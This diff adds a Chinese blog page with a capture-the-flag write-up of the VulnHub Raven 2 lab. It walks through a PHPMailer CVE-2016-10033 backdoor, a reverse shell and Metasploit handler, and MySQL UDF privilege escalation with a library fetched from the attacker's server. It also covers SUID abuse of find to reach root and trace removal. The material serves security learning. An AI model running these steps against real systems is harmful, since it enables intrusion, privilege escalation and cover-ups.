@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>VulnHub-Raven: 2（udf webshell上传提权） - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="VulnHub-Raven: 2（udf webshell上传提权）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-20 21:45" pubdate>
+        2022年5月20日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">VulnHub-Raven: 2（udf webshell上传提权）</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年1月4日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="wp">WP</h2>
+<ol type="1">
+<li>导入靶机，VMware直接：文件-》打开》选择下载好的.ova文件即可</li>
+<li>编辑，虚拟网络编辑器，默认NAT模式，ok，看到靶机网段是192.168.123.0</li>
+</ol>
+<blockquote>
+<p>WP参考🔗：https://icepeak.icu/2021/07/19/vulnhub-ba-chang-raven2/</p>
+<p>https://www.freebuf.com/articles/web/261047.html</p>
+</blockquote>
+<h3 id="主机发现扫描">主机发现扫描</h3>
+<p><code>nmap -sP 192.168.123.0/24</code>，得到靶机ip：192.168.123.129</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153255252.png" srcset="/img/loading.gif" alt="image-20220520153255252" style="zoom:67%;"></p>
+<p>==如果攻击机是linux的话，arp-scan -l 也可以==</p>
+<h3 id="扫端口">扫端口</h3>
+<p>nmap默认扫常用端口<code>nmap 192.168.123.129</code></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153538837.png" srcset="/img/loading.gif" alt="image-20220520153538837" style="zoom:67%;"></p>
+<h3 id="端口开放扫目录">80端口开放，扫目录</h3>
+<p><code>dirsearch -u 192.168.123.129 -i 200</code></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520153805766.png" srcset="/img/loading.gif" alt="image-20220520153805766"></p>
+<p>网站是apache，直接用漏扫工具vulmap，poc master扫一下，都没用洞</p>
+<h3 id="flag1">flag1</h3>
+<p>进入/vendor/</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520154842047.png" srcset="/img/loading.gif" alt="image-20220520154842047" style="zoom:67%;"></p>
+<p>随便点点文件，找到flag1，并且给出了网站绝对路径/var/www/html/vendor/</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520154540630.png" srcset="/img/loading.gif" alt="image-20220520154540630"></p>
+<h3 id="phpmailer-getshell">phpmailer getshell</h3>
+<h4 id="法一使用searchsploit漏洞库中的poc">法一：使用searchsploit漏洞库中的POC</h4>
+<p>进入README.md文件，发现应用phpmailer</p>
+<p>它安装的版本是5.2.16，而且readme、security文件都提示这个应用有漏洞，RCE：<code>CVE-2016-10033</code></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520155317385.png" srcset="/img/loading.gif" alt="image-20220520155317385"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520155433993.png" srcset="/img/loading.gif" alt="image-20220520155433993" style="zoom:67%;"></p>
+<p>msf search一下漏洞</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520160107309.png" srcset="/img/loading.gif" alt="image-20220520160107309" style="zoom:67%;"></p>
+<p>好像不是rce，再用searchsploit搜一下，尝试40974.py文件</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520163147152.png" srcset="/img/loading.gif" alt="image-20220520163147152" style="zoom:67%;"></p>
+<p><code>searchsploit -m 40974</code>，下载脚本到当前目录</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520163457491.png" srcset="/img/loading.gif" alt="image-20220520163457491" style="zoom:80%;"></p>
+<p>漏洞详情：https://github.com/opsxcq/exploit-CVE-2016-10033</p>
+<p>漏洞页面：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171033029.png" srcset="/img/loading.gif" alt="image-20220520171033029" style="zoom:50%;"></p>
+<p>就跟之前漏扫的contact.php很像</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171142349.png" srcset="/img/loading.gif" alt="image-20220520171142349" style="zoom:50%;"></p>
+<p>exp会生成后门文件</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520171108119.png" srcset="/img/loading.gif" alt="image-20220520171108119" style="zoom:67%;"></p>
+<p>直接运行py文件报错，提示没有模块，pip install
+就行了，然后看一下py文件内容再运行</p>
+<p>修改一下其中的内容+参数</p>
+<ul>
+<li>开头，防止乱码出现错误</li>
+</ul>
+<pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python</span>
+# -*- coding: utf-<span class="hljs-number">8</span> -*-</code></pre>
+<ul>
+<li>backdoor为生成的后门文件，名字自定</li>
+</ul>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520220534742.png" srcset="/img/loading.gif" alt="image-20220520220534742"></p>
+<p>然后kali运行py文件</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520220653605.png" srcset="/img/loading.gif" alt="image-20220520220653605" style="zoom:67%;"></p>
+<p>网页访问contact.php，会生成后门hello.php，然后kali监听本地4444端口（提前开放）</p>
+<p>访问http://192.168.123.129/hello.php，一直在转，而kali这边收到shell</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520221100987.png" srcset="/img/loading.gif" alt="image-20220520221100987" style="zoom:67%;"></p>
+<p>进入交互式shell</p>
+<pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> &#x27;<span class="hljs-keyword">import</span> pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre>
+<h4 id="法二msf一键利用exp">法二：msf一键利用exp</h4>
+<p>这里没有用msf，后续发现msf
+也有exp，可以直接用，操作类似，<code>info 0</code>查看exp详情</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521165546240.png" srcset="/img/loading.gif" alt="image-20220521165546240"></p>
+<p>见https://www.freebuf.com/articles/web/261047.html</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521170324960.png" srcset="/img/loading.gif" alt="image-20220521170324960"></p>
+<p>注意，一开始运行失败，后门切换到root就可以了，不知道为啥，可能是权限不够</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521172858750.png" srcset="/img/loading.gif" alt="image-20220521172858750"></p>
+<p>这里也可以像法1一样用searsploit的脚本然后用msf的handle模块监听即可</p>
+<pre><code class="hljs gams">msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
+payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
+msf <span class="hljs-comment">exploit(handler) &gt; set lhost 192.168.123.134</span>
+lhost <span class="hljs-comment">=&gt; 192.168.123.134</span>
+msf <span class="hljs-comment">exploit(handler) &gt; set lport 4444</span>
+lport <span class="hljs-comment">=&gt; 4444</span>
+msf <span class="hljs-comment">exploit(handler) &gt; run</span></code></pre>
+<p>msf可能卡在收到session，但一直进不去，可以<strong>ctrl
+c先退出监听</strong>，再sessions -i进入</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522084302397.png" srcset="/img/loading.gif" alt="image-20220522084302397"></p>
+<h3 id="flag2">flag2</h3>
+<p>进入到工作目录，得到flag2</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520221753424.png" srcset="/img/loading.gif" alt="image-20220520221753424" style="zoom:50%;"></p>
+<p>找flag文件</p>
+<pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span>*</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222205997.png" srcset="/img/loading.gif" alt="image-20220520222205997" style="zoom:67%;"></p>
+<pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wordpress<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span>/flag3.png
+<span class="hljs-regexp">/var/</span>www/flag2.txt</code></pre>
+<h3 id="flag3">flag3</h3>
+<p><strong>命令行怎么看png图片？</strong></p>
+<p>​ --去浏览器看</p>
+<p>​ --<a target="_blank" rel="noopener" href="https://blog.csdn.net/IOT_Flower/article/details/71189329">eog命令</a>、还有其他需安装的工具命令也可以</p>
+<p>成功得到flag3</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222310681.png" srcset="/img/loading.gif" alt="image-20220520222310681" style="zoom:50%;"></p>
+<p>那flag4就是msf提权才能拿到了，通过udf提权使得在mysql执行系统root才能访问的命令，比如看/root</p>
+<h3 id="msf提权">msf提权</h3>
+<blockquote>
+<p><strong>udf提权的利用条件以及数据库版本问题</strong></p>
+<p>获得一个数据库账号，拥有MySQL的insert和delete权限，最好是root。
+拥有将udf.dll写入相应目录的权限。(secure_file_priv为空)</p>
+</blockquote>
+<p>查看本地开放端口，<code>netstat -lpnut</code>3306开放，这里127.0.0.1表示只对本地开放</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521155938157.png" srcset="/img/loading.gif" alt="image-20220521155938157" style="zoom:50%;"></p>
+<p>搜索一下mysql目录，没看到config相关文件，想到是wordpress，cms配置文件看下：<code>wp-config.php</code></p>
+<blockquote>
+<p>因为wordpress搭建网站肯定有数据库配置文件的，通过它寻找数据库账号密码</p>
+</blockquote>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521160452598.png" srcset="/img/loading.gif" alt="image-20220521160452598" style="zoom:50%;"></p>
+<p>得到MySQL账号密码root、R@v3nSecurity</p>
+<h4 id="登录mysql后信息搜集一下">登录mysql后信息搜集一下</h4>
+<p>查看版本、用户、mysql目录，可以看到mysql是root权限</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521161008937.png" srcset="/img/loading.gif" alt="image-20220521161008937" style="zoom:67%;"></p>
+<pre><code class="hljs asciidoc">select @@secure<span class="hljs-emphasis">_file_</span>priv;查看有没有文件操作权限
+
+使用 select @@plugin<span class="hljs-emphasis">_dir 查看当前数据库扩展插件存放的位置</span>
+<span class="hljs-emphasis">也可以</span>
+<span class="hljs-emphasis">show variables like &#x27;%plugin%&#x27;;</span>
+<span class="hljs-emphasis"></span>
+<span class="hljs-emphasis">如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹：</span>
+<span class="hljs-emphasis">mysql &gt; select 233 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_</span>allocation&#x27;;
+
+通过 NTFS ADS流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来
+mysql&gt; select @@basedir;
+<span class="hljs-code">+------------------+</span>
+| @@basedir        |
+<span class="hljs-code">+------------------+</span>
+| /usr/local/mysql |
+<span class="hljs-code">+------------------+</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521163439745.png" srcset="/img/loading.gif" alt="image-20220521163439745" style="zoom:50%;"></p>
+<h4 id="法一使用metasploit自带的动态链接库手动写入">法一：使用metasploit自带的动态链接库手动写入</h4>
+<p>可以直接在msf里使用searchsploit</p>
+<pre><code class="hljs angelscript">searchsploit <span class="hljs-number">1518</span></code></pre>
+<h5 id="写入动态链接库">写入动态链接库</h5>
+<p>如果存在SQL注入的话，可以通过sqlmap参数来上传动态链接库，但需要满足一定条件</p>
+<p>没有注入的话，用SQL语句，条件：secure_file_priv 无限制</p>
+<pre><code class="hljs sql"><span class="hljs-comment"># 直接 SELECT 查询十六进制写入</span>
+<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;
+
+<span class="hljs-comment"># 解码十六进制再写入多此一举</span>
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">unhex</span>(<span class="hljs-string">&#x27;7f454c4602...&#x27;</span>) <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</code></pre>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF
+提权十六进制内容查询</a></p>
+</blockquote>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522163416984.png" srcset="/img/loading.gif" alt="image-20220522163416984"></p>
+<p>这里好像因为文件内容太长，写不进去文件，但是测试发现是可以写入短的</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522163324524.png" srcset="/img/loading.gif" alt="image-20220522163324524" style="zoom:67%;"></p>
+<p>那就换种方法，wget下载下来:kali开启http服务,靶机下载到本机然后mysql读取文件导入到plugin</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zr1213159840/article/details/123671790?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;utm_relevant_index=16">kali中搭建简单http服务的四种方法（其中几种在其他linux中也适用）</a></p>
+</blockquote>
+<pre><code class="hljs angelscript"><span class="hljs-number">1.</span>python3 -m http.server <span class="hljs-number">80</span>   /运行在哪个目录，网站的根目录就在哪
+<span class="hljs-number">2.</span>php -S <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8080</span>  /同上，可以使用-t指定目录。
+<span class="hljs-number">3.</span>ruby -run -e httpd . -p <span class="hljs-number">9000</span>
+<span class="hljs-number">4.</span>busybox httpd -f -p <span class="hljs-number">3333</span></code></pre>
+<p>msf动态链接库位置：</p>
+<pre><code class="hljs awk">whereis metasploit-framework
+cd <span class="hljs-regexp">/usr/</span>share/metasploit-framework
+cd .<span class="hljs-regexp">/data/</span>exploits/mysql</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170121354.png" srcset="/img/loading.gif" alt="image-20220522170121354"></p>
+<p>复制so文件到桌面，然后在桌面运行web服务，就可以在靶机上wget下载文件了</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170631043.png" srcset="/img/loading.gif" alt="image-20220522170631043" style="zoom:67%;"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170621093.png" srcset="/img/loading.gif" alt="image-20220522170621093" style="zoom:67%;"></p>
+<p>靶机shell下载：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522170937082.png" srcset="/img/loading.gif" alt="image-20220522170937082" style="zoom:67%;"></p>
+<p>然后进入MySQL，利用into file写入so文件</p>
+<pre><code class="hljs reasonml">mysql -uroot -pR@v3nSecurity
+
+select load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">lib_mysqludf_sys_64</span>.<span class="hljs-params">so</span>&#x27;)</span> into dumpfile &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so&#x27;;   <span class="hljs-comment">//outfile会有特殊的转换，而dumpfile是原数据导出</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522171713377.png" srcset="/img/loading.gif" alt="image-20220522171713377"></p>
+<h5 id="绑定函数到动态链接库">绑定函数到动态链接库</h5>
+<pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;lib_mysqludf_sys_64.so&#x27;</span>;</code></pre>
+<h5 id="使用系统函数">使用系统函数</h5>
+<p><span style="background:#FF9999;">注意</span>：MySQL msf
+udf提权后不像以前一样返回一个shell操作，需要继续在mysql执行语句进行后续操作以验证</p>
+<p>验证一下:MySQL查询添加的函数</p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;</code></pre>
+<p>利用自定义函数改变find命令权限</p>
+<pre><code class="hljs reasonml">select sys<span class="hljs-constructor">_exec(&#x27;<span class="hljs-params">chmod</span> <span class="hljs-params">u</span>+<span class="hljs-params">s</span> <span class="hljs-operator">/</span><span class="hljs-params">usr</span><span class="hljs-operator">/</span><span class="hljs-params">bin</span><span class="hljs-operator">/</span><span class="hljs-params">find</span>&#x27;)</span>;</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522171911074.png" srcset="/img/loading.gif" alt="image-20220522171911074" style="zoom:67%;"></p>
+<h3 id="flag4">flag4</h3>
+<p>之前找的flag地址：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522172846268.png" srcset="/img/loading.gif" alt="image-20220522172846268" style="zoom:67%;"></p>
+<ol type="1">
+<li>直接利用函数查看flag文件：</li>
+</ol>
+<pre><code class="hljs reasonml">select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">find</span> <span class="hljs-operator">/</span> -<span class="hljs-params">name</span> <span class="hljs-params">flag</span><span class="hljs-operator">*</span>&#x27;)</span>;    
+select sys<span class="hljs-constructor">_eval(&#x27;<span class="hljs-params">cat</span> <span class="hljs-operator">/</span><span class="hljs-params">root</span><span class="hljs-operator">/</span><span class="hljs-params">flag4</span>.<span class="hljs-params">txt</span>&#x27;)</span>;  <span class="hljs-comment">//成功拿到flag4</span></code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522173000803.png" srcset="/img/loading.gif" alt="image-20220522173000803" style="zoom:67%;"></p>
+<ol start="2" type="1">
+<li>也可以suid提权，赋予命令root权限，然后去执行命令的exec参数即可进入root的shell</li>
+</ol>
+<pre><code class="hljs awk">select sys_eval(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>); 
+<span class="hljs-regexp">//</span>给find命令所有者的suid权限，使其可以执行root命令，之后可以退出mysql，在www的shell下使用<span class="hljs-regexp">/usr/</span>bin/find执行root权限
+touch aaa
+find aaa -exec <span class="hljs-string">&quot;/bin/sh&quot;</span> \;  
+<span class="hljs-regexp">//</span>在当前目录下找到aaa文件执行<span class="hljs-regexp">/bin/</span>sh提权，反斜杠 \ 代表结束的标志，与”<span class="hljs-regexp">/bin/</span>sh“ 之间有一个空格
+<span class="hljs-regexp">//</span>这就进入了root的shell，可以直接找flag，也可以上传个msf到msf执行后续操作</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522173741297.png" srcset="/img/loading.gif" alt="image-20220522173741297" style="zoom:50%;"></p>
+<p>后续操作，删除痕迹：删除自定义函数
+<code>drop function sys_exec;</code>
+<code>Delete from mysql.func where name='sys_exec';</code></p>
+<h4 id="法二一键msf操作失败">法二：一键msf操作（失败）</h4>
+<blockquote>
+<p>使用MSF中的 exploit/multi/mysql/mysql_udf_payload
+模块也可以进行UDF提权。MSF会将dll文件写入lib(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为任意创建的名字。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建
+sys_eval() 函数，来执行有回显的命令。</p>
+</blockquote>
+<p>先开启外连，why？</p>
+<p>​ https://blog.csdn.net/weixin_30481539/article/details/113632851</p>
+<p>​ 提权是从MySQL的root提到系统的root</p>
+<p>​
+默认root不外连，msf布置在另一台机器，需开启外连才能提权（在蚁剑/shell/能执行mysql语句的地方）</p>
+<pre><code class="hljs sql">1. mysql -uroot -pR@v3nSecurity
+2. <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;R@v3nSecurity&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;  //&quot;%&quot;表示任何主机都可以远程登录到该服务器上访问
+3. <span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;   //	因为MySQL把权限都放在了<span class="hljs-keyword">cache</span>中，所以在做完更改后需要重新加载。
+<span class="hljs-number">4.</span> 修改/etc/mysql/my.cnf，需要**root用户权限**。找到文件中的：bind-address = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>将其注释掉，保存</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220521164015835.png" srcset="/img/loading.gif" alt="image-20220521164015835"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522111451574.png" srcset="/img/loading.gif" alt="image-20220522111451574"></p>
+<p>​</p>
+<p>需满足3个条件才能外连，这里shell权限太低，不能改配置文件,无法外连</p>
+<p>后续发现要想使用mysql_udf_payload模块
+MySQL需适应于5.5.9以下，这里靶机的mysql版本号为5.5.60，已经超出了版本限制，所以也不能提权</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522174429546.png" srcset="/img/loading.gif" alt="image-20220522174429546" style="zoom:67%;"></p>
+<h4 id="更多方法">更多方法：</h4>
+<p>连上webshell后/可以上传文件的情况下，上传udf.php大马</p>
+<h2 id="一些知识点">一些知识点</h2>
+<h4 id="xshell上传下载文件">xshell上传下载文件</h4>
+<p>利用xshell的<code>rz 、sz</code>下载vps上searchsploit生成的exp</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.cn/linux-438887.html">从linux服务器下载文件到本地的方法</a></p>
+<p>运行rz，会将windows的文件传到linux服务器</p>
+<p>运行<strong>sz</strong> filename，会将文件下载到windows本地</p>
+</blockquote>
+<h4 id="iptables开放端口">iptables开放端口</h4>
+<p>【A是末尾追加，I是第一行追加】</p>
+<pre><code class="hljs pgsql">iptables -A <span class="hljs-keyword">INPUT</span> -ptcp <span class="hljs-comment">--dport  端口号-j ACCEPT</span></code></pre>
+<p>https://blog.csdn.net/weixin_37264997/article/details/80329786</p>
+<p>验证开没开放：监听后nmap扫一下，有就是开放了</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520222651538.png" srcset="/img/loading.gif" alt="image-20220520222651538"></p>
